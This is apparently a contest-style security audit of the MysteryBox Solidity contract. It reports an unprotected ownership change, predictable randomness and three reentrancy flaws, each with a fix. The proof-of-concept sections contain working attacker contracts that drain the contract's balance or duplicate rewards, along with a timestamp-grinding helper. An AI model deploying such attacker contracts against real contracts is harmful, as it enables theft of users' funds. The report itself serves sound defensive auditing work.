<!DOCTYPE html>
<html>
<head>
<style>
    .full-page {
        width:  80%;
        height:  100vh; /* This will make the div take up the full viewport height */
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
    }
    .full-page img {
        max-width:  200;
        max-height:  200;
        margin-bottom: 5rem;
    }
    .full-page div{
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
    }
</style>
</head>
<body>

<div class="full-page">
    <img src="./logo.png" alt="Logo">
    <div>
    <h1>Protocol Audit Report</h1>
    <h3>Prepared by: CryptekMegatron</h3>
    </div>
</div>

</body>
</html>

<!-- Your report starts here! -->

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
- [High](#high)
- [Medium](#medium)
- [Low](#low)
- [Informational](#informational)
- [Gas](#gas)

# Protocol Summary

**MysteryBox** is a thrilling protocol where users can purchase mystery boxes containing random rewards! Open your box to reveal amazing prizes, or trade them with others.


# Disclaimer

The CryptekMegatron team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 

**The findings described in this document correspond the following git repository:**
```
https://github.com/Cyfrin/2024-09-mystery-box.git
```
**with the following commit hash :**
```
281a3e35761a171ba134e574473565a1afb56b68
```

## Scope 

```
src/
--- MysteryBox.sol
```

## Compatibilities

* **Blockchains**: EVM Equivalent Chains Only
* **Tokens**: Standard ERC20 Tokens Only

## Roles

* **Owner/Admin (Trusted)** - Can set the price of boxes, add new rewards, and withdraw funds.
* **User/Player** - Can purchase mystery boxes, open them to receive rewards, and trade rewards with others.


# Executive Summary
## Issues found
| Severity          | Number of issues found |
| ----------------- | ---------------------- |
| High              | 5                      |
| Medium            | 0                      |
| Low               | 0                      |
| Info              | 0                      |
| Gas Optimizations | 0                      |
| Total             | 0                      |
# Findings
# High

### [H-1] `MysteryBox::changeOwner` is callable by anyone allowing anyone take ownership of the contract

**Description:** The `MysteryBox::changeOwner` function is set to be a `public` function, but the purpose of the smart contract is only the owner can set the price of boxes, add new rewards, and withdraw funds. This allows anyone to hijack the contract.

```javascript
    function changeOwner(address _newOwner) public {
@>      // @audit - there a re no access controls here
        owner = _newOwner;
    }
```

**Impact:** Anyone can take ownership of the contract allowing them access to set the price of boxes, add new rewards, and withdraw funds.

**Proof of Concept:**

The following function in `TestMysteryBox.t.sol` serves as proof of code, showing anyone can change ownership of the contract:

```javascript
    function testChangeOwner_AccessControl() public {
        vm.prank(user1);
        mysteryBox.changeOwner(user1);
        assertEq(mysteryBox.owner(), user1);
    }

```

**Recommended Mitigation:** Add an access control modifier to the `changeOwner` function.

```diff
    function changeOwner(address _newOwner) public {
+       require(msg.sender == owner, "Only owner can change contract ownership.");      
        owner = _newOwner;
    }
```

Additionally update the test function in `TestMysteryBox.t.sol`:

```diff
    function testChangeOwner_AccessControl() public {
        vm.prank(user1);
+       vm.expectRevert("Only owner can change contract ownership.");
        mysteryBox.changeOwner(user1);
-       assertEq(mysteryBox.owner(), user1);

    }

+   function testChangeOwner_AccessControl_Owner() public {
+       vm.prank(owner);
+       mysteryBox.changeOwner(user1);
+       assertEq(mysteryBox.owner(), user1);
}
```

### [H-2] Weak randomness in `MysteryBox::openBox` allows anyone to manipulate reward

**Description:** Hashing `block.timestamp` and `msg.sender` together creates a predictable final number, which is bad for a random number generator. Malicious users can manipulate the values or know their value ahead of time to choose the reward.

**Impact:** Any user can choose the reward, selecting the "rarest" reward, making it so the rewards are not random. 

**Proof of Concept:**
The are two attack vectors here:
1.  Validators can know ahead of time the `block.timestamp` and use that knowledge to predict when / how to participate. See the [solidity blog on prevrando](https://soliditydeveloper.com/prevrandao) here.
2.  Users can manipulate the `msg.sender` value to result in them getting the "rarest" reward.

The function below will calculate the block.timestamp to guarantee a non zero value reward for the provided address:

```javascript
    function calculateWinTimestampValue(address addr) public view returns (uint256) {
        uint256 value;
        uint256 winTime = block.timestamp;
                
        do {
            winTime++;
            value = uint256(keccak256(abi.encodePacked(winTime, addr))) % 100;            
        } while (value < 95);

        return winTime;
    }
```

Using on chain values as a randomness seed is a [well known attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

**Recommended Mitigation:** Consider using an oracle for your randomness like [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction).

### [H-3] Reentrancy attack in `MysteryBox::claimAllRewards` allows User/Player with non zero value reward to drain contract balance

**Description:** 
The `MysteryBox::claimAllRewards` function does not follow [CEI/FREI-PI](https://www.nascent.xyz/idea/youre-writing-require-statements-wrong) and as a result, enables any User/Player with a non zero value to drain the contract balance.

In the `MysteryBox::claimAllRewards` function, we first make an external call to the `msg.sender` address, and only after making that external call, we update the `rewardsOwned` array. 

```javascript
    function claimAllRewards() public {
        uint256 totalValue = 0;
        for (uint256 i = 0; i < rewardsOwned[msg.sender].length; i++) {
            totalValue += rewardsOwned[msg.sender][i].value;
        }
        require(totalValue > 0, "No rewards to claim");

@>      (bool success,) = payable(msg.sender).call{value: totalValue}("");
        require(success, "Transfer failed");

@>      delete rewardsOwned[msg.sender];
    }
```

A player who has a non zero value reward eg. a "Bronze Coin" could have a `fallback`/`receive` function that calls the `MysteryBox::claimAllRewards` function again and claim another reward. They could continue to cycle this until the contract balance is drained. 

**Impact:** The balance of the contract can be stolen by a User/Player

**Proof of Concept:**

1. Users buy boxes.
2. Attacker sets up a contract with a `fallback` function that calls `MysteryBox::claimAllRewards`.
3. Attacker buys box, opens it, and gets a non zero value reward. (`MysteryBox::openBox` can be manipulated to guarantee reward).
4. Attacker calls `MysteryBox::claimAllRewards` from their contract, draining the contract balance.

**Proof of Code:** 

<details>
<summary>Code</summary>
Add the following code to the `TestMysteryBoxTest.t.sol` file into the `MysteryBoxTest` contract

```javascript
// @notice function to calculate which block timestamp to open a box on to guarantee anon zero value reward
    // @param addr: address you want to get the reward
    function calculateWinTimestampValue(address addr) public view returns (uint256) {
        uint256 value;
        uint256 winTime = block.timestamp;
                
        do {
            winTime++;
            value = uint256(keccak256(abi.encodePacked(winTime, addr))) % 100;            
        } while (value < 95);

        return winTime;
    }

    function testReentrancyClaimAllRewards() public {
        ReentrancyAttackerClaimAllRewards attacker = new ReentrancyAttackerClaimAllRewards(address(mysteryBox));
        // get price of a box
        uint256 boxPrice = mysteryBox.boxPrice(); 
        
        // set the initial attacker balance to the box price
        vm.deal(address(attacker), boxPrice);

        // calculate timestamp to guarantee win
        uint256 winningTimestamp = calculateWinTimestampValue(address(attacker));

        // set block.timestamp to the winning timestamp
        vm.warp(winningTimestamp);

        // starting contract balance
        uint256 startingContractBalance = address(mysteryBox).balance;

        // run attack contract
        attacker.attack(); 

        uint256 endingAttackerBalance = address(attacker).balance;
        uint256 endingContractBalance = address(mysteryBox).balance;

        uint256 rewardValue = attacker.rewardValue(); 
        
        // calculate max contract value
        uint256 totalMysteryBoxValue = startingContractBalance + boxPrice;

        // calculate number of times withdraw will happen
        uint256 numberOfDuplicates = totalMysteryBoxValue / rewardValue;

        // calculate amount withdrawn
        uint256 totalWithdrawnToAttacker = rewardValue * numberOfDuplicates;

        assertEq(endingAttackerBalance, totalWithdrawnToAttacker);
        assertEq(endingContractBalance, totalMysteryBoxValue -  totalWithdrawnToAttacker);
    }

```
Add the following code to the `TestMysteryBoxTest.t.sol` file

```javascript
contract ReentrancyAttackerClaimAllRewards {
    MysteryBox public mysteryBox;
    uint256 public boxPrice;
    uint256 public rewardValue;
    
    constructor (address _mysteryBox) {
        mysteryBox = MysteryBox(_mysteryBox);
        boxPrice = mysteryBox.boxPrice();
    }

    function attack() external payable { 
        mysteryBox.buyBox{value: boxPrice}();
        mysteryBox.openBox();  
        rewardValue = mysteryBox.getRewards()[0].value;         
        mysteryBox.claimAllRewards();
    }

    receive() external payable {
        if (address(mysteryBox).balance > rewardValue) {
            mysteryBox.claimAllRewards();
        }        
    }

    fallback() external payable {
        if (address(mysteryBox).balance > rewardValue) {
            mysteryBox.claimAllRewards();
        }        
    }
}
```

</details>

**Recommended Mitigation:** 
To fix this, we should have the `MysteryBox::claimAllRewards` function update the `rewardsOwned` array before making the external call as shown below:

```diff
    function claimAllRewards() public {
        uint256 totalValue = 0;
        for (uint256 i = 0; i < rewardsOwned[msg.sender].length; i++) {
            totalValue += rewardsOwned[msg.sender][i].value;
        }
        require(totalValue > 0, "No rewards to claim");

+       delete rewardsOwned[msg.sender];
        (bool success,) = payable(msg.sender).call{value: totalValue}("");
        require(success, "Transfer failed");

-       delete rewardsOwned[msg.sender];
    }
```

### [H-4] Reentrancy attack in `MysteryBox::claimSingleReward` allows User/Player with non zero value reward to drain contract balance

**Description:** 
The `MysteryBox::claimSingleReward` function does not follow [CEI/FREI-PI](https://www.nascent.xyz/idea/youre-writing-require-statements-wrong) and as a result, enables any User/Player with a non zero value to drain the contract balance.

In the `MysteryBox::claimSingleReward` function, we first make an external call to the `msg.sender` address, and only after making that external call, we update the `rewardsOwned` array. 

```javascript
    function claimSingleReward(uint256 _index) public {
        require(_index <= rewardsOwned[msg.sender].length, "Invalid index");
        uint256 value = rewardsOwned[msg.sender][_index].value;
        require(value > 0, "No reward to claim");

@>      (bool success,) = payable(msg.sender).call{value: value}("");
        require(success, "Transfer failed");

@>      delete rewardsOwned[msg.sender][_index];
    }
```

A player who has a non zero value reward eg. a "Bronze Coin" could have a `fallback`/`receive` function that calls the `MysteryBox::claimSingleReward` function again and claim another reward. They could continue to cycle this until the contract balance is drained. 

**Impact:** The balance of the contract can be stolen by a User/Player

**Proof of Concept:**

1. Users buy boxes.
2. Attacker sets up a contract with a `fallback` function that calls `MysteryBox::claimSingleReward`.
3. Attacker buys box, opens it, and gets a non zero value reward. (`MysteryBox::openBox` can be manipulated to guarantee reward).
4. Attacker calls `MysteryBox::claimSingleReward` from their contract, draining the contract balance.

**Proof of Code:** 

<details>
<summary>Code</summary>
Add the following code to the `TestMysteryBoxTest.t.sol` file into the `MysteryBoxTest` contract

```javascript
// @notice function to calculate which block timestamp to open a box on to guarantee anon zero value reward
    // @param addr: address you want to get the reward
    function calculateWinTimestampValue(address addr) public view returns (uint256) {
        uint256 value;
        uint256 winTime = block.timestamp;
                
        do {
            winTime++;
            value = uint256(keccak256(abi.encodePacked(winTime, addr))) % 100;            
        } while (value < 95);

        return winTime;
    }

    function testReentrancyClaimSingleReward() public {
        ReentrancyAttackerClaimSingleReward attacker = new ReentrancyAttackerClaimSingleReward(address(mysteryBox));
        // get price of a box
        uint256 boxPrice = mysteryBox.boxPrice(); 
        
        // set the initial attacker balance to the box price
        vm.deal(address(attacker), boxPrice);

        // calculate timestamp to guarantee win
        uint256 winningTimestamp = calculateWinTimestampValue(address(attacker));

        // set block.timestamp to the winning timestamp
        vm.warp(winningTimestamp);

        // starting contract balance
        uint256 startingContractBalance = address(mysteryBox).balance;

        // run attack contract
        attacker.attack(); 

        uint256 endingAttackerBalance = address(attacker).balance;
        uint256 endingContractBalance = address(mysteryBox).balance;

        uint256 rewardValue = attacker.rewardValue(); 
        
        // calculate max contract value
        uint256 totalMysteryBoxValue = startingContractBalance + boxPrice;

        // calculate number of times withdraw will happen
        uint256 numberOfDuplicates = totalMysteryBoxValue / rewardValue;

        // calculate amount withdrawn
        uint256 totalWithdrawnToAttacker = rewardValue * numberOfDuplicates;

        assertEq(endingAttackerBalance, totalWithdrawnToAttacker);
        assertEq(endingContractBalance, totalMysteryBoxValue -  totalWithdrawnToAttacker);
    }

```
Add the following code to the `TestMysteryBoxTest.t.sol` file

```javascript
contract ReentrancyAttackerClaimSingleReward {
    MysteryBox public mysteryBox;
    uint256 public boxPrice;
    uint256 public rewardValue;
    
    constructor (address _mysteryBox) {
        mysteryBox = MysteryBox(_mysteryBox);
        boxPrice = mysteryBox.boxPrice();
    }

    function attack() external payable { 
        mysteryBox.buyBox{value: boxPrice}();
        mysteryBox.openBox();  
        rewardValue = mysteryBox.getRewards()[0].value;         
        mysteryBox.claimSingleReward(0);
    }

    receive() external payable {
        if (address(mysteryBox).balance > rewardValue) {
            mysteryBox.claimSingleReward(0);
        }        
    }

    fallback() external payable {
        if (address(mysteryBox).balance > rewardValue) {
            mysteryBox.claimSingleReward(0);
        }        
    }
}
```

</details>

**Recommended Mitigation:** 
To fix this, we should have the `MysteryBox::claimSingleReward` function update the `rewardsOwned` array before making the external call as shown below:

```diff
    function claimSingleReward(uint256 _index) public {
        require(_index <= rewardsOwned[msg.sender].length, "Invalid index");
        uint256 value = rewardsOwned[msg.sender][_index].value;
        require(value > 0, "No reward to claim");

+       delete rewardsOwned[msg.sender][_index];
        (bool success,) = payable(msg.sender).call{value: value}("");
        require(success, "Transfer failed");

-       delete rewardsOwned[msg.sender][_index];
    }
```

### [H-5] Reentrancy attack in `MysteryBox::claimSingleReward` and `MysteryBox::transferReward` allows User/Player with non zero value reward to withdraw and transfer the reward

**Description:** 
The `MysteryBox::claimSingleReward` function does not follow [CEI/FREI-PI](https://www.nascent.xyz/idea/youre-writing-require-statements-wrong) and as a result, enables any User/Player with a non zero value to drain the contract balance.

In the `MysteryBox::claimSingleReward` function, we first make an external call to the `msg.sender` address, and only after making that external call, we update the `rewardsOwned` array. 

```javascript
    function claimSingleReward(uint256 _index) public {
        require(_index <= rewardsOwned[msg.sender].length, "Invalid index");
        uint256 value = rewardsOwned[msg.sender][_index].value;
        require(value > 0, "No reward to claim");

@>      (bool success,) = payable(msg.sender).call{value: value}("");
        require(success, "Transfer failed");

@>      delete rewardsOwned[msg.sender][_index];
    }
```

A player who has a non zero value reward eg. a "Bronze Coin" could have a `fallback`/`receive` function that calls the `MysteryBox::transferReward` function to copy the reward to an arbitrary address.

**Impact:** A non zero reward can be copied to an arbitrary address AND withdrawn by User/Player

**Proof of Concept:**

1. Users buy boxes.
2. Attacker sets up a contract with a `fallback` function that calls `MysteryBox::transferReward`.
3. Attacker buys box, opens it, and gets a non zero value reward. (`MysteryBox::openBox` can be manipulated to guarantee reward).
4. Attacker calls `MysteryBox::transferReward` from their contract, copying the reward to the address.

**Proof of Code:** 

<details>
<summary>Code</summary>
Add the following code to the `TestMysteryBoxTest.t.sol` file into the `MysteryBoxTest` contract

```javascript
// @notice function to calculate which block timestamp to open a box on to guarantee anon zero value reward
    // @param addr: address you want to get the reward
    function calculateWinTimestampValue(address addr) public view returns (uint256) {
        uint256 value;
        uint256 winTime = block.timestamp;
                
        do {
            winTime++;
            value = uint256(keccak256(abi.encodePacked(winTime, addr))) % 100;            
        } while (value < 95);

        return winTime;
    }

    function testCrossReentrancy() public {
        address receiver = makeAddr("receiver");
        CrossReentrancyAttackerSender attacker = new CrossReentrancyAttackerSender(address(mysteryBox), receiver);
        // get price of a box
        uint256 boxPrice = mysteryBox.boxPrice(); 
        
        // set the initial attacker balance to the box price
        vm.deal(address(attacker), boxPrice);

        // calculate timestamp to guarantee win
        uint256 winningTimestamp = calculateWinTimestampValue(address(attacker));

        // set block.timestamp to the winning timestamp
        vm.warp(winningTimestamp);

        // starting contract balance
        uint256 startingContractBalance = address(mysteryBox).balance;

        // run attack contract
        attacker.attack(); 

        uint256 endingAttackerBalance = address(attacker).balance;
        uint256 endingContractBalance = address(mysteryBox).balance;

        uint256 rewardValue = attacker.rewardValue(); 
        
        // calculate max contract value
        uint256 totalMysteryBoxValue = startingContractBalance + boxPrice;

        // calculate number of times withdraw will happen
        //uint256 numberOfDuplicates = totalMysteryBoxValue / rewardValue;

        // calculate amount withdrawn
        //uint256 totalWithdrawnToAttacker = rewardValue * numberOfDuplicates;

        vm.prank(receiver);
        uint256 receiverRewards = mysteryBox.getRewards().length;

        assertEq(endingAttackerBalance, rewardValue);
        assertEq(endingContractBalance, totalMysteryBoxValue -  rewardValue);
        assertEq(receiverRewards, 1);
    }

```
Add the following code to the `TestMysteryBoxTest.t.sol` file

```javascript
contract CrossReentrancyAttackerSender {
    MysteryBox public mysteryBox;
    address toAddr;
    uint256 public rewardValue;
    uint256 public boxPrice;
    
    constructor (address _mysteryBox, address _toAddr) {
        mysteryBox = MysteryBox(_mysteryBox);
        boxPrice = mysteryBox.boxPrice();
        toAddr = _toAddr;
    }

    function attack() external payable { 
        mysteryBox.buyBox{value: boxPrice}();
        mysteryBox.openBox();
        rewardValue = mysteryBox.getRewards()[0].value;
        mysteryBox.claimSingleReward(0);
    }

    receive() external payable {
        mysteryBox.transferReward(toAddr, 0);      
    }

    fallback() external payable {
        mysteryBox.transferReward(toAddr, 0); 
    }
}
```

</details>

**Recommended Mitigation:** 
To fix this, we should have the `MysteryBox::claimSingleReward` function update the `rewardsOwned` array before making the external call as shown below:

```diff
    function claimSingleReward(uint256 _index) public {
        require(_index <= rewardsOwned[msg.sender].length, "Invalid index");
        uint256 value = rewardsOwned[msg.sender][_index].value;
        require(value > 0, "No reward to claim");

+       delete rewardsOwned[msg.sender][_index];
        (bool success,) = payable(msg.sender).call{value: value}("");
        require(success, "Transfer failed");

-       delete rewardsOwned[msg.sender][_index];
    }
```

# Medium
# Low 
# Informational
# Gas 